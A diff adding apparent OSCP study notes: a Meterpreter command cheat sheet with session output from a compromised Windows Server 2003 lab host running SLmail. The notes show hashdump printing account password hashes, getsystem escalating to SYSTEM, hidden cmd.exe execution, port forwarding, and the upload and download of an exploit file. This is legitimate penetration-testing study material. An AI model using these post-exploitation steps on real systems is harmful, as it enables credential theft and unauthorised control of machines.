@@ -1,0 +1,81 @@
+METERPRETER
+Meterpreter
+
+
+help
+sysinfo
+ifconfig  ipconfig
+getpid
+guid uuid
+get_timeouts
+upload [local kali file] [remote file]
+download
+hashdump
+getsystem
+execute -f cmd.exe -c -i -H
+portfwd
+shell
+background
+quit
+
+meterpreter > sysinfo
+Computer        : M-B1F37E1025E24
+OS              : Windows .NET Server (Build 3790, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > 
+
+meterpreter > upload /root/Documents/OSCP/slmail_exploit c:\
+ > 
+☑  uploading  : /root/Documents/OSCP/slmail_exploit -> c:
+☑  uploaded   : /root/Documents/OSCP/slmail_exploit -> c:\slmail_exploit
+meterpreter > 
+
+meterpreter > shell
+Process 2240 created.
+Channel 3 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\Program Files\SLmail\System>
+
+meterpreter > cat c:\\slmail_exploit
+#########################################################
+#                                                       #
+# SLmail 5.5 POP3 PASS Buffer Overflow                  #
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : MS TCP Loopback interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1520
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:028b3daee473f17a65cd374cf1b10e29:::
+meterpreter > 
+
+meterpreter > portfwd add -l 555 -p 556 -r 172.16.238.128
+☑  Local TCP relay created: :555 <-> 172.16.238.128:556
+meterpreter > 
+
+meterpreter > download c:\\slmail_exploit
+☑  Downloading: c:\slmail_exploit -> slmail_exploit
+☑  Downloaded 3.59 KiB of 3.59 KiB (100.0%): c:\slmail_exploit -> slmail_exploit
+☑  download   : c:\slmail_exploit -> slmail_exploit
+meterpreter > 
+
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > 
+
+
+
+
+
